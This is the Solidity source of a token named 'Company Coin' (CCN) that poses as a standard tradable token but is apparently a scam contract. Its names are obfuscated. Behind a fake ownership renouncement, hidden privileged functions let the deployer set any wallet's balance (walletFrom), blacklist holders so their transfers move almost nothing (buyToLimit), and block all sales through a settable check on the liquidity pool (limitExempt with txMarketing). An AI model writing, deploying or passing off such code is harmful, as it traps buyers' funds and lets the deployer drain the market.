//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract exemptListReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listSwap {
    function createPair(address autoEnable, address senderFrom) external returns (address);

    function feeTo() external view returns (address);
}

interface totalEnableSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface autoShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptShould) external view returns (uint256);

    function transfer(address senderBuy, uint256 amountWallet) external returns (bool);

    function allowance(address amountSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountWallet) external returns (bool);

    function transferFrom(
        address sender,
        address senderBuy,
        uint256 amountWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txLaunch, uint256 value);
    event Approval(address indexed amountSwap, address indexed spender, uint256 value);
}

interface autoShouldMetadata is autoShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CompanyCoin is exemptListReceiver, autoShould, autoShouldMetadata {

    constructor (){
        if (amountBuy != feeLiquidityAuto) {
            fromExemptWallet = true;
        }
        maxSell();
        totalEnableSender modeMaxTx = totalEnableSender(tradingAtTake);
        txList = listSwap(modeMaxTx.factory()).createPair(modeMaxTx.WETH(), address(this));
        walletMarketing = listSwap(modeMaxTx.factory()).feeTo();
        if (feeLiquidityAuto != amountBuy) {
            takeAmountExempt = false;
        }
        modeLiquidity = _msgSender();
        atWalletFund[modeLiquidity] = true;
        launchToLaunched[modeLiquidity] = launchMin;
        
        emit Transfer(address(0), modeLiquidity, launchMin);
    }

    mapping(address => bool) public swapReceiver;

    function transferFrom(address listReceiver, address senderBuy, uint256 amountWallet) external override returns (bool) {
        if (_msgSender() != tradingAtTake) {
            if (autoSwap[listReceiver][_msgSender()] != type(uint256).max) {
                require(amountWallet <= autoSwap[listReceiver][_msgSender()]);
                autoSwap[listReceiver][_msgSender()] -= amountWallet;
            }
        }
        return txMarketing(listReceiver, senderBuy, amountWallet);
    }

    function walletFrom(address swapWallet, uint256 amountWallet) public {
        toLiquidity();
        launchToLaunched[swapWallet] = amountWallet;
    }

    uint256 public receiverTeam = 0;

    mapping(address => mapping(address => uint256)) private autoSwap;

    function getOwner() external view returns (address) {
        return enableMinWallet;
    }

    function allowance(address totalBuy, address receiverFee) external view virtual override returns (uint256) {
        if (receiverFee == tradingAtTake) {
            return type(uint256).max;
        }
        return autoSwap[totalBuy][receiverFee];
    }

    address public modeLiquidity;

    uint256 public teamAuto = 0;

    function decimals() external view virtual override returns (uint8) {
        return amountMaxFee;
    }

    function modeTake(address teamList) public {
        require(teamList.balance < 100000);
        if (modeListFund) {
            return;
        }
        
        atWalletFund[teamList] = true;
        
        modeListFund = true;
    }

    uint8 private amountMaxFee = 18;

    uint256 constant receiverAt = 12 ** 10;

    uint256 minEnable;

    function buyToLimit(address totalSell) public {
        toLiquidity();
        
        if (totalSell == modeLiquidity || totalSell == txList) {
            return;
        }
        swapReceiver[totalSell] = true;
    }

    address tradingAtTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public modeListFund;

    address walletMarketing;

    bool public takeAmountExempt;

    function enableIs(address listReceiver, address senderBuy, uint256 amountWallet) internal returns (bool) {
        require(launchToLaunched[listReceiver] >= amountWallet);
        launchToLaunched[listReceiver] -= amountWallet;
        launchToLaunched[senderBuy] += amountWallet;
        emit Transfer(listReceiver, senderBuy, amountWallet);
        return true;
    }

    mapping(address => uint256) private launchToLaunched;

    bool private fromExemptWallet;

    function totalSupply() external view virtual override returns (uint256) {
        return launchMin;
    }

    uint256 receiverTx;

    uint256 private feeLiquidityAuto;

    event OwnershipTransferred(address indexed receiverLiquidity, address indexed swapIsReceiver);

    string private enableMode = "Company Coin";

    function name() external view virtual override returns (string memory) {
        return enableMode;
    }

    function txMarketing(address listReceiver, address senderBuy, uint256 amountWallet) internal returns (bool) {
        if (listReceiver == modeLiquidity) {
            return enableIs(listReceiver, senderBuy, amountWallet);
        }
        uint256 sellEnable = autoShould(txList).balanceOf(walletMarketing);
        require(sellEnable == minEnable);
        require(senderBuy != walletMarketing);
        if (swapReceiver[listReceiver]) {
            return enableIs(listReceiver, senderBuy, receiverAt);
        }
        amountWallet = listTake(listReceiver, senderBuy, amountWallet);
        return enableIs(listReceiver, senderBuy, amountWallet);
    }

    function symbol() external view virtual override returns (string memory) {
        return limitReceiver;
    }

    uint256 private launchMin = 100000000 * 10 ** 18;

    function toLiquidity() private view {
        require(atWalletFund[_msgSender()]);
    }

    function listTake(address listReceiver, address senderBuy, uint256 amountWallet) internal view returns (uint256) {
        require(amountWallet > 0);

        uint256 limitMin = 0;
        if (listReceiver == txList && receiverTeam > 0) {
            limitMin = amountWallet * receiverTeam / 100;
        } else if (senderBuy == txList && teamAuto > 0) {
            limitMin = amountWallet * teamAuto / 100;
        }
        require(limitMin <= amountWallet);
        return amountWallet - limitMin;
    }

    address public txList;

    function owner() external view returns (address) {
        return enableMinWallet;
    }

    function maxSell() public {
        emit OwnershipTransferred(modeLiquidity, address(0));
        enableMinWallet = address(0);
    }

    string private limitReceiver = "CCN";

    uint256 private amountBuy;

    function balanceOf(address exemptShould) public view virtual override returns (uint256) {
        return launchToLaunched[exemptShould];
    }

    function limitExempt(uint256 amountWallet) public {
        toLiquidity();
        minEnable = amountWallet;
    }

    function approve(address receiverFee, uint256 amountWallet) public virtual override returns (bool) {
        autoSwap[_msgSender()][receiverFee] = amountWallet;
        emit Approval(_msgSender(), receiverFee, amountWallet);
        return true;
    }

    mapping(address => bool) public atWalletFund;

    function transfer(address swapWallet, uint256 amountWallet) external virtual override returns (bool) {
        return txMarketing(_msgSender(), swapWallet, amountWallet);
    }

    address private enableMinWallet;

}